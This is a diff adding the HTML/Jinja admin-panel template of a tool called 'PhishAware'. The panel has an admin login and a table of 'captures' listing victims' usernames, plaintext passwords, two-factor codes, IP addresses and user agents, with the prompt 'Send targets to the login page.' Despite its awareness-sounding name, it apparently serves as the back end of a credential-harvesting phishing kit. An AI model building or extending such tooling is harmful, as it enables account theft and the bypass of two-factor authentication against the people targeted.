@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PhishAware - Admin Panel</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+</head>
+<body>
+    {% if login %}
+    <div class="container">
+        <div class="login-card">
+            <h2>Admin Login</h2>
+            {% if error %}
+            <div class="error-msg">{{ error }}</div>
+            {% endif %}
+            <form method="POST" action="/admin">
+                <input type="text" name="username" placeholder="Admin Username" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+        </div>
+    </div>
+    {% else %}
+    <div class="admin-container">
+        <div class="admin-header">
+            <h1>PhishAware Admin Panel</h1>
+            <div class="admin-actions">
+                <span class="capture-count">{{ count }} capture(s)</span>
+                <form method="POST" action="/admin/clear" style="display:inline;">
+                    <button type="submit" class="btn-danger">Clear All Data</button>
+                </form>
+                <a href="/logout" class="btn-logout">Logout</a>
+            </div>
+        </div>
+
+        {% if data %}
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>#</th>
+                    <th>Timestamp</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>2FA Code</th>
+                    <th>Status</th>
+                    <th>IP Address</th>
+                    <th>User Agent</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for entry in data %}
+                <tr>
+                    <td>{{ loop.index }}</td>
+                    <td>{{ entry.timestamp }}</td>
+                    <td>{{ entry.username }}</td>
+                    <td class="sensitive">{{ entry.password }}</td>
+                    <td class="sensitive">{{ entry.two_fa_code or '-' }}</td>
+                    <td><span class="badge badge-{{ entry.status }}">{{ entry.status }}</span></td>
+                    <td>{{ entry.ip_address }}</td>
+                    <td class="ua-cell" title="{{ entry.user_agent }}">{{ entry.user_agent[:50] }}...</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty-state">
+            <p>No data captured yet. Send targets to the login page.</p>
+        </div>
+        {% endif %}
+    </div>
+    {% endif %}
+</body>
+</html>
